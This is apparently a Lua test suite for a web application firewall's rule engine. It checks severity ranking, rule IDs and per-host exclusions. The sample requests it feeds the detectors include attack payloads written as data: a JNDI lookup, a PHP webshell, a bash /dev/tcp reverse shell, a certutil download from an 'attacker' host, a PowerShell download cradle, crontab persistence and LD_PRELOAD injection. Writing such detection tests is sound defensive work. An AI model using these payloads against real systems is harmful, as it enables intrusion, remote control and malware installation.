-- Tests for cfm_waf _M.check severity-aggregation behaviour (Step 1 of the
-- WAF rework). Verifies that:
--   * a single hit returns the rule's configured action;
--   * highest severity wins when multiple rules fire on the same request;
--   * a block hit short-circuits later detectors;
--   * disabled rules never affect enforcement;
--   * body-only detectors are gated by method+body presence;
--   * the return tuple is the documented (hit, reason, ttl, action, hits).
--
-- Pattern: at the start of each test, disable every rule, then enable only
-- the rules under test via _M.set_rule. This keeps unrelated detectors out
-- of the picture and makes assertions deterministic.

_G.ngx = {
  now            = function() return 1000 end,
  decode_base64  = function(_) return nil end,
  log            = function(_, _) end,
  ERR            = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local function disable_all_rules()
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then
      waf.set_rule(k, "disabled")
    end
  end
end

local function fresh_ctx(overrides)
  local ctx = {
    uri     = "/",
    args    = "",
    method  = "GET",
    ip      = "1.2.3.4",
    headers = {},
    body    = "",
  }
  for k, v in pairs(overrides or {}) do ctx[k] = v end
  return ctx
end

-- ── Test 1: single block rule fires and returns block ────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_rce", "block")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    args = "x=${jndi:ldap://evil/}",
  }))
  check(hit == true,                     "1: rce block — hit=true")
  check(reason == "WAF_RCE",             "1: rce block — reason WAF_RCE")
  check(action == "block",               "1: rce block — action=block")
  check(type(hits) == "table" and #hits == 1, "1: rce block — hits has 1 entry")
end

-- ── Test 2: single logonly rule returns logonly ──────────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "logonly")

  local hit, reason, _ttl, action = waf.check(fresh_ctx({ uri = "/foo/../etc/passwd" }))
  check(hit == true,            "2: traversal logonly — hit=true")
  check(reason == "WAF_TRAVERSAL", "2: traversal logonly — reason")
  check(action == "logonly",    "2: traversal logonly — action=logonly")
end

-- ── Test 3: single challenge rule returns challenge ──────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_bad_ua", "challenge")

  local hit, reason, _ttl, action = waf.check(fresh_ctx({
    headers = { ["User-Agent"] = "sqlmap/1.5.0" },
  }))
  check(hit == true,                                "3: bad_ua challenge — hit=true")
  check(reason and reason:sub(1, 10) == "WAF_BAD_UA", "3: bad_ua challenge — reason prefix")
  check(action == "challenge",                      "3: bad_ua challenge — action=challenge")
end

-- ── Test 4: logonly first + block later → block (severity wins) ──────────────
-- Traversal (rule 5, logonly) fires first; RCE (rule 6, block) fires next.
-- A first-match WAF would have returned logonly. We return block.
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "logonly")
  waf.set_rule("rule_rce",       "block")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    uri  = "/foo/../",
    args = "x=${jndi:ldap://",
  }))
  check(hit == true,        "4: logonly+block — hit=true")
  check(reason == "WAF_RCE", "4: logonly+block — final reason is WAF_RCE")
  check(action == "block",   "4: logonly+block — final action is block")
  check(#hits == 2,          "4: logonly+block — both hits recorded")
end

-- ── Test 5: challenge first + block later → block (severity wins) ────────────
-- Bad UA (rule 1, challenge) fires; then RCE (rule 6, block) fires.
do
  disable_all_rules()
  waf.set_rule("rule_bad_ua", "challenge")
  waf.set_rule("rule_rce",    "block")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    args    = "x=${jndi:ldap://",
    headers = { ["User-Agent"] = "sqlmap/1.5.0" },
  }))
  check(hit == true,        "5: challenge+block — hit=true")
  check(reason == "WAF_RCE", "5: challenge+block — final reason is WAF_RCE")
  check(action == "block",   "5: challenge+block — final action is block")
  check(#hits == 2,          "5: challenge+block — both hits recorded")
end

-- ── Test 6: block short-circuits later detectors ─────────────────────────────
-- RCE (rule 6) records block and goto-dones. XSS (rule 20) is configured
-- to fire on the same input but must never run.
do
  disable_all_rules()
  waf.set_rule("rule_rce", "block")
  waf.set_rule("rule_xss", "challenge")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    args = "x=${jndi:ldap://&y=<script>alert(1)</script>",
  }))
  check(hit == true,        "6: short-circuit — hit=true")
  check(reason == "WAF_RCE", "6: short-circuit — RCE wins")
  check(action == "block",   "6: short-circuit — action=block")
  check(#hits == 1,          "6: short-circuit — only RCE recorded, XSS skipped")
end

-- ── Test 7: multiple logonly rules → final logonly ───────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "logonly")
  waf.set_rule("rule_ip_host",   "logonly")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    uri     = "/foo/../",
    headers = { ["Host"] = "10.0.0.1" },
  }))
  check(hit == true,                                                   "7: 2x logonly — hit=true")
  check(action == "logonly",                                           "7: 2x logonly — final action=logonly")
  check(#hits == 2,                                                    "7: 2x logonly — both hits recorded")
  check(reason == "WAF_TRAVERSAL" or reason == "WAF_IP_HOST",          "7: 2x logonly — reason from one of them")
end

-- ── Test 8: disabled rule does not affect enforcement ────────────────────────
-- Even if RCE input is present, with rule_rce=disabled there should be no hit.
do
  disable_all_rules()
  -- Leave rule_rce disabled; provide a payload that *would* trigger it.

  local hit = waf.check(fresh_ctx({ args = "x=${jndi:ldap://" }))
  check(hit == false, "8: disabled — no hit even with payload present")
end

-- ── Test 9: body-only detector skipped on GET (body_inspect_ok gating) ───────
-- rule_php_webshell_body is body-only and requires method=POST. A clean GET
-- with a webshell body must not fire it.
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  local body = "<?php @eval($_POST['x']); system('id'); ?>"
  local hit = waf.check(fresh_ctx({
    method  = "GET",
    body    = body,
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
  }))
  check(hit == false, "9: GET+body — body detector gated off, no hit")
end

-- ── Test 10: same body fires on POST ─────────────────────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  local body = "<?php @eval($_POST['x']); system('id'); ?>"
  local hit, reason, _ttl, action = waf.check(fresh_ctx({
    method  = "POST",
    body    = body,
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
  }))
  check(hit == true,                                              "10: POST+body — hit=true")
  check(reason and reason:sub(1, 22) == "WAF_PHP_WEBSHELL_BODY:", "10: POST+body — reason prefix")
  check(action == "challenge",                                    "10: POST+body — action=challenge")
end

-- ── Test 11: return tuple shape on no-hit ─────────────────────────────────────
do
  disable_all_rules()

  local hit, reason, ttl, action, hits = waf.check(fresh_ctx({}))
  check(hit == false, "11: no-hit — hit=false")
  check(reason == nil, "11: no-hit — reason is nil")
  check(ttl == nil,    "11: no-hit — ttl is nil")
  check(action == nil, "11: no-hit — action is nil")
  -- hits can be nil OR an empty table; accept either.
  check(hits == nil or (type(hits) == "table" and #hits == 0), "11: no-hit — hits empty/nil")
end

-- ── Test 12: hits[] preserves order and per-entry shape ──────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_bad_ua",    "challenge")
  waf.set_rule("rule_traversal", "logonly")

  local _hit, _reason, _ttl, _action, hits = waf.check(fresh_ctx({
    uri     = "/foo/../",
    headers = { ["User-Agent"] = "sqlmap/1.5.0" },
  }))
  check(#hits == 2,                          "12: hits — 2 entries")
  -- Bad UA is rule 1; traversal is rule 5. So bad_ua should be hits[1].
  check(hits[1] and hits[1].action == "challenge", "12: hits — first entry is bad_ua challenge")
  check(hits[2] and hits[2].reason == "WAF_TRAVERSAL", "12: hits — second entry is traversal")
  check(hits[1].ttl ~= nil, "12: hits — entry has ttl")
end

-- ── Test 13: get_rule_ids() exposes the registry; rule_id_for(key) lookups ───
do
  local ids = waf.get_rule_ids()
  check(type(ids) == "table",                        "13: get_rule_ids — returns table")
  check(ids.rule_traversal == 101,                   "13: ids — rule_traversal=101")
  check(ids.rule_rce == 320,                         "13: ids — rule_rce=320")
  check(ids.rule_proxy_header_sqli == 321,           "13: ids — rule_proxy_header_sqli=321")
  check(ids.rule_xmlrpc_pingback == 511,             "13: ids — rule_xmlrpc_pingback=511")
  check(ids.rule_cmd_payload_pipe_bash == 315,       "13: ids — rule_cmd_payload_pipe_bash=315")

  -- Caller mutation must not leak into the live table.
  ids.rule_traversal = 999
  local ids2 = waf.get_rule_ids()
  check(ids2.rule_traversal == 101,                  "13: ids — table is a copy, original intact")

  check(waf.rule_id_for("rule_traversal") == 101,    "13: rule_id_for — known key returns ID")
  check(waf.rule_id_for("rule_does_not_exist") == nil, "13: rule_id_for — unknown key returns nil")
  check(waf.rule_id_for(nil) == nil,                 "13: rule_id_for — nil input returns nil")
  check(waf.rule_id_for(42) == nil,                  "13: rule_id_for — non-string returns nil")
end

-- ── Test 14: hit entries carry waf_rule_id; 6th return value is the strongest ─
do
  disable_all_rules()
  waf.set_rule("rule_rce", "block")

  local hit, _reason, _ttl, _action, hits, waf_rule_id = waf.check(fresh_ctx({
    args = "x=${jndi:ldap://evil/}",
  }))
  check(hit == true,                                 "14: rce — hit=true")
  check(waf_rule_id == 320,                          "14: rce — 6th return is rule_rce ID 320")
  check(hits[1] and hits[1].waf_rule_id == 320,      "14: rce — hits[1].waf_rule_id == 320")
end

-- ── Test 15: severity-wins picks the strongest rule's ID, not first-match ────
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "logonly")  -- ID 101
  waf.set_rule("rule_rce",       "block")     -- ID 320

  local hit, _reason, _ttl, _action, hits, waf_rule_id = waf.check(fresh_ctx({
    uri  = "/foo/../",
    args = "x=${jndi:ldap://",
  }))
  check(hit == true,                                 "15: combo — hit=true")
  check(waf_rule_id == 320,                          "15: combo — final waf_rule_id is RCE (320), not TRAVERSAL (101)")
  check(#hits == 2,                                  "15: combo — both hits recorded")
  -- Iteration order at call sites: traversal records before RCE.
  check(hits[1].waf_rule_id == 101,                  "15: combo — hits[1] is traversal (101)")
  check(hits[2].waf_rule_id == 320,                  "15: combo — hits[2] is rce (320)")
end

-- ── Test 16: cmd_payload sub-rule IDs map per tag ─────────────────────────────
do
  disable_all_rules()
  -- All cmd_payload variants default to "challenge" except backtick (logonly);
  -- explicit set is defensive in case of CFG drift.
  waf.set_rule("rule_cmd_payload",            "challenge")
  waf.set_rule("rule_cmd_payload_pipe_bash",  "challenge")

  local hit, _reason, _ttl, _action, _hits, waf_rule_id = waf.check(fresh_ctx({
    args = "x=foo|bash",
  }))
  if hit then
    check(waf_rule_id == 315,                        "16: cmd_payload pipe_bash — ID 315")
  end
  -- Tolerant pass: detector might match a different tag depending on
  -- payload tokenisation; we just ensure that *if* it hit, the ID came from
  -- the per-tag override map (any 311-317).
  if hit and waf_rule_id ~= 315 then
    check(waf_rule_id and waf_rule_id >= 311 and waf_rule_id <= 317,
      "16: cmd_payload — fell back to a sibling tag ID in 311-317")
  end
end

-- ── Test 17: ctx.skip_rule_ids suppresses excluded rule hits ─────────────────
-- Per-vhost rule exclusions: when an operator excludes a rule for a host, the
-- detector still runs but record() drops the hit. Verify no leak into hits[]
-- or the strongest-action return tuple.
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "challenge")
  -- Rule fires (uri = "/foo/../"), but skip_rule_ids = {[101]=true} should
  -- suppress it as if the rule were disabled for this host.
  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    uri = "/foo/../",
    skip_rule_ids = { [101] = true },
  }))
  check(hit == false,                "17: skip_rule_ids — rule 101 suppressed, no hit")
  check(reason == nil,               "17: skip_rule_ids — reason nil")
  check(action == nil,               "17: skip_rule_ids — action nil")
  check(hits == nil or #hits == 0,   "17: skip_rule_ids — hits empty")
end

-- ── Test 18: skip_rule_ids only suppresses the listed IDs; others still fire ─
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "logonly")  -- ID 101 — to be skipped
  waf.set_rule("rule_rce",       "block")    -- ID 320 — must still fire

  local hit, _reason, _ttl, action, hits, rule_id = waf.check(fresh_ctx({
    uri  = "/foo/../",
    args = "x=${jndi:ldap://evil/}",
    skip_rule_ids = { [101] = true },
  }))
  check(hit == true,         "18: skip_rule_ids — non-excluded rule (320) still fires")
  check(action == "block",   "18: skip_rule_ids — block action survives")
  check(rule_id == 320,      "18: skip_rule_ids — strongest rule_id is RCE")
  check(#hits == 1,          "18: skip_rule_ids — only 1 hit recorded (101 was suppressed)")
  check(hits[1].waf_rule_id == 320, "18: skip_rule_ids — hits[1] is RCE not traversal")
end

-- ── Test 19: W1 webshell_path — known drop name fires (rule 410) ─────────────
do
  disable_all_rules()
  waf.set_rule("rule_webshell_path", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    uri = "/wp-content/uploads/c99.php",
  }))
  check(hit == true,                          "19: webshell_path — hit")
  check(reason == "WAF_WEBSHELL:PATH:c99.php", "19: webshell_path — reason")
  check(action == "logonly",                   "19: webshell_path — logonly")
  check(rule_id == 410,                        "19: webshell_path — rule id 410")
end

-- ── Test 20: W1 webshell_path — case-insensitive basename match ──────────────
do
  disable_all_rules()
  waf.set_rule("rule_webshell_path", "logonly")

  local hit, reason = waf.check(fresh_ctx({ uri = "/UPLOADS/R57.PHP?cmd=id" }))
  check(hit == true,                          "20: webshell_path — case-insensitive hit")
  check(reason == "WAF_WEBSHELL:PATH:r57.php", "20: webshell_path — basename lowered")
end

-- ── Test 21: W1 webshell_path — non-matching path doesn't fire ───────────────
do
  disable_all_rules()
  waf.set_rule("rule_webshell_path", "logonly")

  local hit = waf.check(fresh_ctx({ uri = "/help/r57.php-explained.html" }))
  check(hit == false, "21: webshell_path — basename mismatch, no hit")
end

-- ── Test 22: R1 reverse_shell — bash /dev/tcp in args (rule 322) ─────────────
do
  disable_all_rules()
  waf.set_rule("rule_reverse_shell", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    uri  = "/cgi-bin/exploit.cgi",
    args = "cmd=bash%20-i%20%3E%26%20/dev/tcp/1.2.3.4/4444",
  }))
  check(hit == true,                                "22: reverse_shell — hit")
  check(reason and reason:find("WAF_RCE:REVERSE_SHELL:BASH_TCP", 1, true),
                                                    "22: reverse_shell — reason")
  check(action == "logonly",                        "22: reverse_shell — logonly")
  check(rule_id == 322,                             "22: reverse_shell — rule id 322")
end

-- ── Test 23: R1 reverse_shell — python -c socket in POST body ────────────────
do
  disable_all_rules()
  waf.set_rule("rule_reverse_shell", "logonly")

  local hit, reason = waf.check(fresh_ctx({
    method = "POST",
    body   = "code=python -c 'import socket;s=socket.socket()'",
  }))
  check(hit == true,                                                "23: reverse_shell — body hit")
  check(reason and reason:find("REVERSE_SHELL:PY_SOCKET", 1, true), "23: reverse_shell — PY_SOCKET tag")
end

-- ── Test 24: R1 reverse_shell — benign string doesn't fire ───────────────────
do
  disable_all_rules()
  waf.set_rule("rule_reverse_shell", "logonly")

  -- "import socket" alone (without "python -c") must not match.
  local hit = waf.check(fresh_ctx({
    method = "POST",
    body   = "Hello, this article explains how to import socket in python.",
  }))
  check(hit == false, "24: reverse_shell — bare 'import socket' prose, no hit")
end

-- ── Test 25: B5 webshell_ping — POST + empty UA + CL:0 + .php (rule 411) ─────
do
  disable_all_rules()
  waf.set_rule("rule_webshell_ping", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method = "POST",
    uri    = "/uploads/x.php",
    headers = {
      ["User-Agent"]     = "",
      ["Content-Length"] = "0",
    },
  }))
  check(hit == true,                       "25: webshell_ping — hit")
  check(reason == "WAF_WEBSHELL:PING",     "25: webshell_ping — reason")
  check(action == "logonly",               "25: webshell_ping — logonly")
  check(rule_id == 411,                    "25: webshell_ping — rule id 411")
end

-- ── Test 26: B5 webshell_ping — non-php URI doesn't fire ─────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_webshell_ping", "logonly")

  local hit = waf.check(fresh_ctx({
    method = "POST",
    uri    = "/api/event",
    headers = {
      ["User-Agent"]     = "",
      ["Content-Length"] = "0",
    },
  }))
  check(hit == false, "26: webshell_ping — non-php URI, no hit")
end

-- ── Test 27: B5 webshell_ping — UA present doesn't fire (legit POST) ─────────
do
  disable_all_rules()
  waf.set_rule("rule_webshell_ping", "logonly")

  local hit = waf.check(fresh_ctx({
    method = "POST",
    uri    = "/uploads/x.php",
    headers = {
      ["User-Agent"]     = "Mozilla/5.0",
      ["Content-Length"] = "0",
    },
  }))
  check(hit == false, "27: webshell_ping — non-empty UA, no hit")
end

-- ── Test 28: R2 persistence — crontab append in args (rule 323) ──────────────
do
  disable_all_rules()
  waf.set_rule("rule_persistence", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    args = "cmd=(crontab%20-l;%20echo%20miner)",
  }))
  check(hit == true,                                            "28: persistence — hit")
  check(reason and reason:find("PERSISTENCE:CRONTAB_APPEND", 1, true),
                                                                "28: persistence — tag")
  check(action == "logonly",                                    "28: persistence — logonly")
  check(rule_id == 323,                                         "28: persistence — rule id 323")
end

-- ── Test 29: R2 persistence — bare crontab mention doesn't fire ──────────────
do
  disable_all_rules()
  waf.set_rule("rule_persistence", "logonly")

  -- "crontab -l" alone is too benign to flag (admin tools list cron).
  local hit = waf.check(fresh_ctx({
    method = "POST",
    body   = "Run 'crontab -l' to list cron entries.",
  }))
  check(hit == false, "29: persistence — bare crontab -l prose, no hit")
end

-- ── Test 30: R3 rootkit_artifacts — LD_PRELOAD path in body (rule 324) ───────
do
  disable_all_rules()
  waf.set_rule("rule_rootkit_artifacts", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method = "POST",
    body   = "evil=LD_PRELOAD=/tmp/x.so /usr/bin/id",
  }))
  check(hit == true,                                          "30: rootkit — hit")
  check(reason and reason:find("ROOTKIT:LD_PRELOAD_PATH", 1, true),
                                                              "30: rootkit — tag")
  check(action == "logonly",                                  "30: rootkit — logonly")
  check(rule_id == 324,                                       "30: rootkit — rule id 324")
end

-- ── Test 31: R3 rootkit_artifacts — bare LD_PRELOAD mention doesn't fire ─────
do
  disable_all_rules()
  waf.set_rule("rule_rootkit_artifacts", "logonly")

  -- "LD_PRELOAD" without the =/ assignment shape is benign prose.
  local hit = waf.check(fresh_ctx({
    method = "POST",
    body   = "The LD_PRELOAD environment variable lets you preload a shared library.",
  }))
  check(hit == false, "31: rootkit — bare LD_PRELOAD prose, no hit")
end

-- ── Test 32: R4 lolbin — certutil downloader (rule 325) ──────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_lolbin", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method = "POST",
    body   = "cmd=certutil -urlcache -split -f http://attacker/x.exe",
  }))
  check(hit == true,                                          "32: lolbin — hit")
  check(reason and reason:find("LOLBIN:CERTUTIL_URLCACHE", 1, true),
                                                              "32: lolbin — tag")
  check(action == "logonly",                                  "32: lolbin — logonly")
  check(rule_id == 325,                                       "32: lolbin — rule id 325")
end

-- ── Test 33: R4 lolbin — IEX-WebClient is R1's territory, not R4's ───────────
do
  disable_all_rules()
  waf.set_rule("rule_lolbin",        "logonly")
  waf.set_rule("rule_reverse_shell", "logonly")

  -- Pattern that's intentionally only in R1's table (not R4's). Asserts R4
  -- doesn't double-count it; the hit should come from rule 322, not 325.
  local hit, _reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
    method = "POST",
    body   = "cmd=iex(new-object net.webclient).downloadstring('http://x')",
  }))
  check(hit == true,    "33: lolbin/r1 — IEX-WebClient hit")
  check(rule_id == 322, "33: lolbin/r1 — credited to R1 (322), not R4 (325)")
end

-- ── Test 34: C2 java_deserialize — base64 prefix in body (rule 326) ──────────
do
  disable_all_rules()
  waf.set_rule("rule_java_deserialize", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method = "POST",
    body   = "payload=rO0ABXNyABxqYXZhLnV0aWwuQXJyYXlMaXN0",
  }))
  check(hit == true,                                                "34: java_deserialize — hit")
  check(reason == "WAF_RCE:JAVA_DESERIALIZE:B64_PREFIX",            "34: java_deserialize — reason")
  check(action == "logonly",                                        "34: java_deserialize — logonly")
  check(rule_id == 326,                                             "34: java_deserialize — rule id 326")
end

-- ── Test 35: C2 java_deserialize — raw magic bytes in body ──────────────────
do
  disable_all_rules()
  waf.set_rule("rule_java_deserialize", "logonly")

  -- Construct a body with the raw 4-byte STREAM_MAGIC + STREAM_VERSION.
  local body = "garbagepre\xac\xed\x00\x05garbagepost"
  local hit, reason = waf.check(fresh_ctx({
    method = "POST",
    body   = body,
  }))
  check(hit == true,                                       "35: java_deserialize — raw magic hit")
  check(reason == "WAF_RCE:JAVA_DESERIALIZE:RAW_MAGIC",    "35: java_deserialize — RAW_MAGIC tag")
end

-- ── Test 36: C2 java_deserialize — hex form in args ──────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_java_deserialize", "logonly")

  local hit, reason = waf.check(fresh_ctx({
    args = "blob=aced00057372001c6a6176",
  }))
  check(hit == true,                                       "36: java_deserialize — hex hit")
  check(reason == "WAF_RCE:JAVA_DESERIALIZE:HEX_PREFIX",   "36: java_deserialize — HEX_PREFIX tag")
end

-- ── Test 37: C2 java_deserialize — Cookie header carries the gadget ──────────
do
  disable_all_rules()
  waf.set_rule("rule_java_deserialize", "logonly")

  local hit, reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
    headers = { ["Cookie"] = "JSESSIONID=rO0ABXNyABF" },
  }))
  check(hit == true,                                               "37: java_deserialize — cookie hit")
  check(reason == "WAF_RCE:JAVA_DESERIALIZE:B64_PREFIX",           "37: java_deserialize — cookie reason")
  check(rule_id == 326,                                            "37: java_deserialize — cookie rule id")
end

-- ── Test 38: C2 java_deserialize — benign base64 doesn't fire ────────────────
do
  disable_all_rules()
  waf.set_rule("rule_java_deserialize", "logonly")

  -- "Hello world" base64 = "SGVsbG8gd29ybGQ=" — has no rO0AB prefix and
  -- no aced0005 substring. Verifies the detector doesn't fire on random b64.
  local hit = waf.check(fresh_ctx({
    args = "data=SGVsbG8gd29ybGQ=",
  }))
  check(hit == false, "38: java_deserialize — benign base64, no hit")
end

-- ── Test 39: C2 java_deserialize — does NOT shadow PHP serialize (rule 306) ──
do
  disable_all_rules()
  waf.set_rule("rule_java_deserialize", "logonly")
  waf.set_rule("rule_serialize",        "logonly")

  -- PHP serialized object — should fire 306 only, not 326.
  local hit, _reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
    args = 'data=O:8:"stdClass":1:{s:1:"x";i:1;}',
  }))
  check(hit == true,    "39: java/php disjoint — PHP serialize fires")
  check(rule_id == 306, "39: java/php disjoint — credited to PHP (306), not Java (326)")
end

-- ── Test 40: W2 ext — webshell-name b374k + <?php scores past threshold ──────
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  -- b374k (+3) + <?php (+2) = 5 → exactly at min_score, fires.
  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    body    = "src=<?php /* b374k loader */",
  }))
  check(hit == true,                            "40: W2 ext — hit")
  check(reason == "WAF_PHP_WEBSHELL_BODY:RAW_WS_B374K", "40: W2 ext — RAW_WS_B374K tag")
  check(action == "challenge",                  "40: W2 ext — challenge")
  check(rule_id == 404,                         "40: W2 ext — rule id 404 (extension, not new rule)")
end

-- ── Test 41: W2 ext — bare webshell-name in prose without <?php doesn't fire ─
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  -- Just "b374k" alone (+3) is below min_score (5). The early-out lets us
  -- reach scoring (b374k is a trigger), but score stays under threshold.
  local hit = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = "text/plain" },
    body    = "Article comment: I read about the b374k shell yesterday.",
  }))
  check(hit == false, "41: W2 ext — bare prose mention doesn't trigger")
end

-- ── Test 42: W2 ext — c99shell name takes precedence over generic eval tag ──
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  -- c99shell (+3) + <?php (+2) + eval( (+3) = 8. Both ws_tag and the
  -- callable would emit a tag; ws_tag wins per the design.
  local _hit, reason = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    body    = "code=<?php c99shell; eval($_POST['x']);",
  }))
  check(reason == "WAF_PHP_WEBSHELL_BODY:RAW_WS_C99SHELL",
        "42: W2 ext — webshell-name tag outranks RAW_EVAL_POST")
end

-- ── Test 43: W3 ext — hex2bin contributes to obfuscation score (rule 405) ───
do
  disable_all_rules()
  waf.set_rule("rule_script_obfuscation", "challenge")

  -- hex2bin (+2) + base64_decode (+2) + eval (+3) = 7 → past min_score (6).
  local hit, reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    body    = "x=eval(hex2bin(base64_decode($_POST['p'])))",
  }))
  check(hit == true,                                         "43: W3 ext — hit")
  check(reason and reason:find("HEX2BIN", 1, true),          "43: W3 ext — HEX2BIN in tags")
  check(rule_id == 405,                                      "43: W3 ext — rule id 405")
end

-- ── Test 44: B2 ext — TRACE method emits sub-tag in reason ──────────────────
do
  disable_all_rules()
  waf.set_rule("rule_exploit_methods", "block")

  local hit, reason, _ttl, action = waf.check(fresh_ctx({ method = "TRACE" }))
  check(hit == true,                              "44: B2 ext — TRACE hit")
  check(reason == "WAF_EXPLOIT_METHOD:TRACE",     "44: B2 ext — sub-tag emitted")
  check(action == "block",                        "44: B2 ext — block action preserved")
end

-- ── Test 45: B2 ext — PROPFIND emits DAV_PROPFIND sub-tag ───────────────────
do
  disable_all_rules()
  waf.set_rule("rule_exploit_methods", "challenge")

  local _hit, reason = waf.check(fresh_ctx({ method = "PROPFIND" }))
  check(reason == "WAF_EXPLOIT_METHOD:DAV_PROPFIND",
        "45: B2 ext — DAV_PROPFIND sub-tag")
end

-- ── Test 46: X2-stratum ext — stratum+tcp:// fires rule 701 ─────────────────
do
  disable_all_rules()
  waf.set_rule("rule_ssrf", "logonly")

  local hit, reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
    args = "url=stratum+tcp://pool.minexmr.com:4444",
  }))
  check(hit == true,                          "46: X2-stratum — hit")
  check(reason == "WAF_SSRF:SSRF_STRATUM",    "46: X2-stratum — reason")
  check(rule_id == 701,                       "46: X2-stratum — rule id 701 (folded, not new)")
end

if fails > 0 then
  io.stderr:write(string.format("\n%d severity test(s) failed\n", fails))
  os.exit(1)
end
print("ok: cfm_waf severity-aggregation tests")
